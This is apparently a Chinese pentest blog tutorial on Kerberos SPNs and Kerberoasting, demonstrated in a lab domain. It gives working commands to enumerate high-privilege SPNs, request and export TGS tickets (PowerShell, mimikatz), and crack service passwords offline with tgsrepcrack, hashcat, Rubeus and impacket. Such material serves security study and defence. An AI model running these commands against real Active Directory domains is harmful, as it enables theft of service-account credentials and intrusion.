---
title: "Kerberos协议之Kerberoasting和SPN"
date: 2020-11-13T11:51:28+08:00
draft: false
tags:
- Kerberos
- Kerberoasting
- SPN
series:
- Windows协议
categories:
- 渗透测试
---

填坑
<!--more-->

在之前Kerberos的TGS_REQ & TGS_REP过程中提到，只要用户提供的票据正确，服务就会返回自身hash加密的tgs票据，那么如果我们有一个域用户，就可以申请服务的tgs票据，本地爆破服务hash得到服务密码，这个过程叫做Kerberoasting。而在域中，服务通过spn来作为唯一标识，所以本文介绍的是Kerberoasting和spn。

# SPN简介
SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN

SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下

当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下

当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下

# SPN的格式

```
serviceclass/host:port/servicename
```
1. serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等
2. host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01
3. 如果服务运行在默认端口上，则端口号(port)可以省略

我这里通过 `setspn -A MSSQLSvc/DM.test.local:1433 sqladmin` 注册一个名为MSSQLSvc的SPN，将他分配给sqladmin这个域管账户

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/69653a0d-d2dd-7bbd-134f-a8a877061a65.png)

# SPN查询
spn查询实际上是通过ldap协议查询的，那么当前用户必须是域用户或者是机器账户。

```powershell
setspn -q */*
setspn -T test.local -q */*
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/2e857d13-5733-97e4-954d-eaf8ce9e6adc.png)

CN=Users的是域账户注册的SPN，CN=Computers是机器账户。

域内的任意主机都可以查询SPN，任何一个域用户都可以申请TGS票据。而我们爆破的话应该选择域用户进行爆破，因为机器用户的口令无法远程链接。

那么Kerberoasting思路如下：
1. 查询SPN寻找在Users下并且是高权限域用户的服务
2. 请求并导出TGS
3. 爆破

# Kerberoasting利用

首先需要寻找有价值的SPN

## 使用powerview

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

```powershell
Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5dea4c8e-7615-4184-2141-4588b6f452f8.png)

## 使用powershell模块Active Directory
Active Directory只在域控的powershell上有

```powershell
import-module ActiveDirectory
get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/7b40cdcc-0d0c-20d5-5dcd-06acce35ae08.png)

可以用三好学生师傅导出来的 https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll



```powershell
import-module .\Microsoft.ActiveDirectory.Management.dll
```

## 使用kerberoast

powershell: https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

vbs: https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs

参数如下：

```
cscript GetUserSPNs.vbs
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/e3c5db29-295a-e241-f06c-e4d698886921.png)

## 请求TGS
请求指定服务的tgs

```powershell
$SPNName = 'MSSQLSvc/DM.test.local'
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/abfee6e8-7bfe-abcf-2e1c-691c5679dab2.png)

请求所有服务的tgs

```powershell
Add-Type -AssemblyName System.IdentityModel  
setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
```
## 导出TGS
```
kerberos::list /export
```
## 破解TGS
https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py

```
./tgsrepcrack.py wordlist.txt test.kirbi
```

## Invoke-Kerberoast
不需要mimikatz，直接导出hash为hashcat能破解的。

https://github.com/EmpireProject/Empire/blob/6ee7e036607a62b0192daed46d3711afc65c3921/data/module_source/credentials/Invoke-Kerberoast.ps1

```powershell
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d09867c5-e8b1-4b00-7b75-2f5dcfd9efa0.png)

hashcat

```
hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
```

## Rubeus
```
Rubeus.exe kerberoast
```

## impacket
1. https://github.com/maaaaz/impacket-examples-windows/
2. https://github.com/SecureAuthCorp/impacket

```
python .\GetUserSPNs.py -request -dc-ip 172.16.33.3 -debug test.local/jack
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b9ec9ebf-035d-816b-24cd-6e8a5fb25223.png)

hashcat直接跑
# 参考
1. https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/
2. https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**